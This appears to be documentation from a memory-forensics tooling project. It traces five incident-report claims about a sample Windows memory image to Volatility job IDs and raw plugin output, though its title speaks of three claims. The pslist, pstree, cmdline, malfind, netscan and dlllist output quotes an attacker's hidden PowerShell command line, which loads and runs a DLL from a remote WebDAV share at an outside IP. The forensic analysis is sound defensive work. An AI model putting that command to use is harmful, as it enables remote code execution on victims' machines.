# Three-Claim Trace — Reveal Case

This document maps headline findings from the final `generate_incident_report`
output to the exact tool execution(s) in [`docs/sample_trace.jsonl`](sample_trace.jsonl)
that produced them, plus the actual evidence text returned by Volatility for that
job. The trace and the excerpts below come from the **same run**
(`logs/trace_20260614_182749.jsonl`, captured 2026-06-14T18:27-18:28 UTC against
`cases/reveal.dmp`), so job IDs line up exactly between the two files.

Use this as the audit-trail key: every claim below is `job_id -> plugin -> page(s)
in docs/sample_trace.jsonl -> raw output line`. The case is reconstructable from
`docs/sample_trace.jsonl` + this file without re-running anything.

---

## Claim 1 — PID 4120 is the orphaned root of the compromise, with two children:
decoy `wordpad.exe` (PID 9112) and hidden `powershell.exe` (PID 3692)

- **Tool execution:** `launch_volatility_plugin(image_slug="reveal", plugin_slug="pslist")`
  -> `job_id = a1d22326-ef0b-45e2-8ab5-1b04d2348db8`
- **Trace events:** `job_started` / `job_finished` (`rows_returned: 30`,
  `was_truncated: true`) and 4x `read_job_output_page` (pages 1-4 of 4, all paged
  per the protocol gate)
- **Raw output (page 4 of 4):**
  ```
  PID    PPID   ImageFileName   Offset(V)        Threads  Handles  SessionId  Wow64  CreateTime                      ExitTime  ...
  9112   4120   wordpad.exe     0xc90c0991d080   8        -        1          False  2024-07-15 07:00:03.000000 UTC  N/A  Disabled
  3692   4120   powershell.exe  0xc90c0358b080   17       -        1          False  2024-07-15 07:00:03.000000 UTC  N/A  Disabled
  ```

---

## Claim 2 — PID 3692's full command line: hidden PowerShell delivering a payload
via WebDAV/rundll32

- **Tool executions:**
  - `launch_volatility_plugin(plugin_slug="pstree")` -> `job_id = f5de92ab-8b45-453e-91a6-1bbf295774ee`
  - `launch_volatility_plugin(plugin_slug="cmdline", extra_args=["--pid", "3692"])`
    -> `job_id = 323e5656-77f7-49fa-b8a7-894aa50d5b91`
- **Trace events:** `pstree` job (`rows_returned: 30`, `was_truncated: true`, 4x
  `read_job_output_page`); `cmdline --pid 3692` job (`rows_returned: 2`,
  `was_truncated: false` — small enough that no paging was needed)
- **Raw output — pstree (page 4 of 4):**
  ```
  3692   4120  powershell.exe  0xc90c0358b080  17  -  1  False  2024-07-15 07:00:03.000000 UTC  N/A
    \Device\HarddiskVolume3\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
  * 2416  3692  net.exe      0xc90c08fd6080  5  -  1  False  2024-07-15 07:00:06.000000 UTC  N/A
    "C:\Windows\system32\net.exe" use \\45.9.74.32@8888\davwwwroot\
  ```
- **Raw output — cmdline --pid 3692 (single page, not truncated):**
  ```
  PID    Process         Args
  3692   powershell.exe  powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry
  ```

---

## Claim 3 — Process injection: 5x `PAGE_EXECUTE_READWRITE` regions in PID 3692

- **Tool execution:** `launch_volatility_plugin(plugin_slug="malfind", extra_args=["--pid", "3692"])`
  -> `job_id = c935d0ef-b215-427e-b45e-b02bfffd7d8f`
- **Trace events:** `job_finished` (`rows_returned: 30`, `was_truncated: true`,
  92 raw lines) and 4x `read_job_output_page` (pages 1-4 of 4 — fully paged before
  `generate_incident_report` was allowed to proceed)
- **Raw output (all 5 RWX regions, across pages 1-4):**
  ```
  PID   Process         Start VPN       End VPN          Tag   Protection             CommitCharge  PrivateMemory
  3692  powershell.exe  0x1cb6aa50000   0x1cb6aa5ffff    VadS  PAGE_EXECUTE_READWRITE  2             1
  3692  powershell.exe  0x1cb6c3e0000   0x1cb6c3e6fff    VadS  PAGE_EXECUTE_READWRITE  1             1
  3692  powershell.exe  0x1cb6cac0000   0x1cb6cacffff    VadS  PAGE_EXECUTE_READWRITE  9             1
  3692  powershell.exe  0x7df44e2c0000  0x7df44e2cffff   VadS  PAGE_EXECUTE_READWRITE  1             1
  3692  powershell.exe  0x7df44e2d0000  0x7df44e36ffff   VadS  PAGE_EXECUTE_READWRITE  2             1
  ```

---

## Claim 4 — Live C2 connection: PID 2416 (`net.exe`) ESTABLISHED to `45.9.74.32:8888`

- **Tool execution:** `launch_volatility_plugin(plugin_slug="netscan")`
  -> `job_id = eb81ee49-0e83-4820-a043-134f950d87cb`
- **Trace events:** `job_finished` (`rows_returned: 30`, `was_truncated: true`) and
  3x `read_job_output_page` (pages 1-3 of 3, fully paged)
- **Raw output (page 2 of 3):**
  ```
  Offset            Proto   LocalAddr         LocalPort  ForeignAddr  ForeignPort  State        PID   Owner    Created
  0xc90c09f8db50    TCPv4   192.168.19.150    51038      45.9.74.32   8888         ESTABLISHED  2416  net.exe  2024-07-15 07:00:06.000000 UTC
  ```

---

## Claim 5 — Loaded module list confirms the hidden process is genuinely `powershell.exe`
(not a renamed/spoofed binary)

- **Tool execution:** `launch_volatility_plugin(plugin_slug="dlllist", extra_args=["--pid", "3692"])`
  -> `job_id = 9b090067-9e25-4ae1-8b6f-25b3748c4dd4`
- **Trace events:** `job_finished` (`rows_returned: 30`, `was_truncated: true`, 61
  raw lines) and 2x `read_job_output_page` (pages 1-2 of 2, fully paged)
- **Raw output (page 1 of 2):**
  ```
  PID   Process         Base             Size      Name            Path
  3692  powershell.exe  0x7ff7b2e70000   0x71000   powershell.exe  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  3692  powershell.exe  0x7fffedbd0000   0x1f8000  ntdll.dll       C:\Windows\SYSTEM32\ntdll.dll
  3692  powershell.exe  0x7fffec050000   0xbd000   KERNEL32.DLL    C:\Windows\System32\KERNEL32.DLL
  ```

---

## Final report status (job 6 of 6)

`generate_incident_report(image_slug="reveal")` -> `status: REPORT_READY`,
`total_jobs: 6`. All 6 jobs (`pslist`, `pstree`, `cmdline`, `malfind`, `netscan`,
`dlllist`) report `fully_explored: true` — the protocol gate's `PROTOCOL_ERROR`
on the initial `pslist` (see `docs/sample_trace.jsonl`, event 8: `"blocked_by":
"a1d22326-..."`) was cleared only after every truncated job was fully paged, per
`generate_incident_report`'s gate logic in `server/mcp_vol_server.py`.
